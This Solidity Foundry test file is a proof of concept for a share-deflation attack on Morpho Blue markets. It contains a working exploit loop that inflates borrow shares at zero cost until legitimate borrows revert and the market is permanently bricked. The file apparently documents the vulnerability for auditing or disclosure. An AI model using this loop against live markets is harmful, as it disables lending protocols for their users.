// SPDX-License-Identifier: BUSL-1.1
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {MorphoBorrowPosition} from "src/borrow/MorphoBorrowPosition.sol";
import {MorphoBorrowPositionFactory} from "src/borrow/MorphoBorrowPositionFactory.sol";
import {Morpho} from "lib/morpho-blue/src/Morpho.sol";
import {IMorpho, Id, MarketParams, Market} from "lib/morpho-blue/src/interfaces/IMorpho.sol";
import {MockERC20} from "test/mock/MockERC20.sol";
import {OracleMock} from "lib/morpho-blue/src/mocks/OracleMock.sol";
import {IrmMock} from "lib/morpho-blue/src/mocks/IrmMock.sol";
import {MarketParamsLib} from "lib/morpho-blue/src/libraries/MarketParamsLib.sol";
import {LibClone} from "lib/solady/src/utils/LibClone.sol";

/// @title MorphoBorrowPositionShareDeflationTest
/// @notice PoC: Share deflation attack bricks a Morpho market before any legitimate borrower appears.
///
///         Morpho Blue allows borrowing by specifying a share amount. When there are no borrowers
///         (totalBorrowAssets = 0), the share-to-asset conversion rounds down to 0 for any amount of
///         shares below (totalBorrowShares + VIRTUAL_SHARES). An attacker exploits this by iteratively
///         borrowing the maximum number of shares that still yields 0 assets, roughly doubling
///         totalBorrowShares each iteration. After ~108 iterations totalBorrowShares approaches
///         type(uint128).max while totalBorrowAssets remains 0.
///
///         Once inflated, any legitimate borrow computes:
///           shares = toSharesUp(assets, 0, hugeShares) ≈ assets * hugeShares
///         which exceeds uint128 and reverts on the safe cast, permanently bricking the market.
contract MorphoBorrowPositionShareDeflationTest is Test {
  using MarketParamsLib for MarketParams;
  using LibClone for address;

  IMorpho public morpho;
  MockERC20 public loanToken;
  MockERC20 public collateralToken;
  OracleMock public oracle;
  IrmMock public irm;
  MarketParams public marketParams;
  Id public marketId;

  address public owner;
  address public attacker;

  uint256 constant DEFAULT_LLTV = 0.8e18;
  uint128 constant SAFE_LTV = 0.65e18;
  uint128 constant LIQUIDATION_LTV = 0.72e18;
  uint256 constant DEFAULT_ORACLE_PRICE = 1e36;
  uint256 constant VIRTUAL_SHARES = 1e6;

  function setUp() public {
    owner = makeAddr("owner");
    attacker = makeAddr("attacker");

    // Deploy Morpho and mocks
    morpho = IMorpho(address(new Morpho(owner)));
    loanToken = new MockERC20("USDC", "USDC", 6);
    collateralToken = new MockERC20("wUSCC", "wUSCC", 18);
    oracle = new OracleMock();
    oracle.setPrice(DEFAULT_ORACLE_PRICE);
    irm = new IrmMock();

    vm.startPrank(owner);
    morpho.enableIrm(address(irm));
    morpho.enableLltv(DEFAULT_LLTV);
    vm.stopPrank();

    // Create the target Morpho market
    marketParams = MarketParams({
      loanToken: address(loanToken),
      collateralToken: address(collateralToken),
      oracle: address(oracle),
      irm: address(irm),
      lltv: DEFAULT_LLTV
    });
    vm.prank(owner);
    morpho.createMarket(marketParams);
    marketId = marketParams.id();
  }

  /// @notice PoC: An attacker inflates totalBorrowShares to near uint128.max for free,
  ///         then a legitimate 1 USDC borrow reverts (market is bricked).
  function test_shareDeflation_bricksMarket() public {
    // ── Step 1: Protocol supplies liquidity (simulates the normal workflow window) ──
    uint256 supplyAmount = 1_000_000e6; // 1M USDC
    loanToken.setBalance(address(this), supplyAmount);
    loanToken.approve(address(morpho), supplyAmount);
    morpho.supply(marketParams, supplyAmount, 0, address(this), "");

    // ── Step 2: Attacker supplies minimal collateral ──
    // With totalBorrowAssets always 0, the health check sees borrowed = 1 asset (toAssetsUp).
    // 10 wei of collateral at 1:1 price with 80% LLTV → maxBorrow = 8 ≥ 1. Passes.
    collateralToken.setBalance(attacker, 10);
    vm.startPrank(attacker);
    collateralToken.approve(address(morpho), 10);
    morpho.supplyCollateral(marketParams, 10, attacker, "");

    // ── Step 3: Exponential share inflation loop ──
    // Each iteration borrows the max shares that still yield 0 assets:
    //   assets = shares * (totalBorrowAssets + 1) / (totalBorrowShares + 1e6)
    //   For assets = 0: shares < totalBorrowShares + 1e6
    //
    // This roughly doubles totalBorrowShares per iteration.
    // After ~108 iterations it approaches type(uint128).max.
    uint256 totalBorrowShares;
    uint256 uint128Max = uint256(type(uint128).max);

    for (uint256 i = 0; i < 130; i++) {
      uint256 maxShares = totalBorrowShares + VIRTUAL_SHARES - 1;

      // Cap to avoid uint128 overflow on Morpho's storage
      if (totalBorrowShares + maxShares > uint128Max) {
        maxShares = uint128Max - totalBorrowShares;
        if (maxShares == 0) break;
      }

      morpho.borrow(marketParams, 0, maxShares, attacker, attacker);
      totalBorrowShares += maxShares;
    }
    vm.stopPrank();

    // ── Verify: totalBorrowShares is enormous, totalBorrowAssets is still 0 ──
    Market memory m = morpho.market(marketId);
    assertEq(uint256(m.totalBorrowAssets), 0, "totalBorrowAssets should be 0 (no real debt)");
    assertGt(uint256(m.totalBorrowShares), 1e36, "totalBorrowShares should be astronomical");

    // ── Step 4: Legitimate user tries to borrow 1 USDC — reverts ──
    // shares = toSharesUp(1e6, 0, ~3.4e38) ≈ 1e6 * 3.4e38 = 3.4e44
    // This exceeds uint128.max → toUint128() reverts, bricking the market.
    address legitimateUser = makeAddr("legitimateUser");
    collateralToken.setBalance(legitimateUser, 1_000e18);
    vm.startPrank(legitimateUser);
    collateralToken.approve(address(morpho), 1_000e18);
    morpho.supplyCollateral(marketParams, 1_000e18, legitimateUser, "");

    vm.expectRevert();
    morpho.borrow(marketParams, 1e6, 0, legitimateUser, legitimateUser);
    vm.stopPrank();
  }

  /// @notice Same attack but verifying that MorphoBorrowPosition.borrow() is also bricked.
  function test_shareDeflation_bricksMorphoBorrowPosition() public {
    // Deploy a MorphoBorrowPosition on the target market
    MorphoBorrowPositionFactory factory = new MorphoBorrowPositionFactory(owner);
    address positionManager = makeAddr("positionManager");
    address bp = factory.createBorrowPosition(morpho, marketId, positionManager, SAFE_LTV, LIQUIDATION_LTV);
    MorphoBorrowPosition borrowPosition = MorphoBorrowPosition(bp);

    // Supply liquidity
    uint256 supplyAmount = 1_000_000e6;
    loanToken.setBalance(address(this), supplyAmount);
    loanToken.approve(address(morpho), supplyAmount);
    morpho.supply(marketParams, supplyAmount, 0, address(this), "");

    // ── Attacker inflates shares directly on Morpho ──
    collateralToken.setBalance(attacker, 10);
    vm.startPrank(attacker);
    collateralToken.approve(address(morpho), 10);
    morpho.supplyCollateral(marketParams, 10, attacker, "");

    uint256 totalBorrowShares;
    uint256 uint128Max = uint256(type(uint128).max);
    for (uint256 i = 0; i < 130; i++) {
      uint256 maxShares = totalBorrowShares + VIRTUAL_SHARES - 1;
      if (totalBorrowShares + maxShares > uint128Max) {
        maxShares = uint128Max - totalBorrowShares;
        if (maxShares == 0) break;
      }
      morpho.borrow(marketParams, 0, maxShares, attacker, attacker);
      totalBorrowShares += maxShares;
    }
    vm.stopPrank();

    // ── Protocol tries to use the MorphoBorrowPosition — bricked ──
    vm.startPrank(positionManager);
    collateralToken.approve(address(borrowPosition), type(uint256).max);
    loanToken.approve(address(borrowPosition), type(uint256).max);
    vm.stopPrank();

    // Supply collateral through the position
    collateralToken.setBalance(positionManager, 1_000e18);
    vm.prank(positionManager);
    borrowPosition.supplyCollateral(1_000e18);

    // Borrow reverts — the market is bricked
    vm.prank(positionManager);
    vm.expectRevert();
    borrowPosition.borrow(1e6);
  }
}
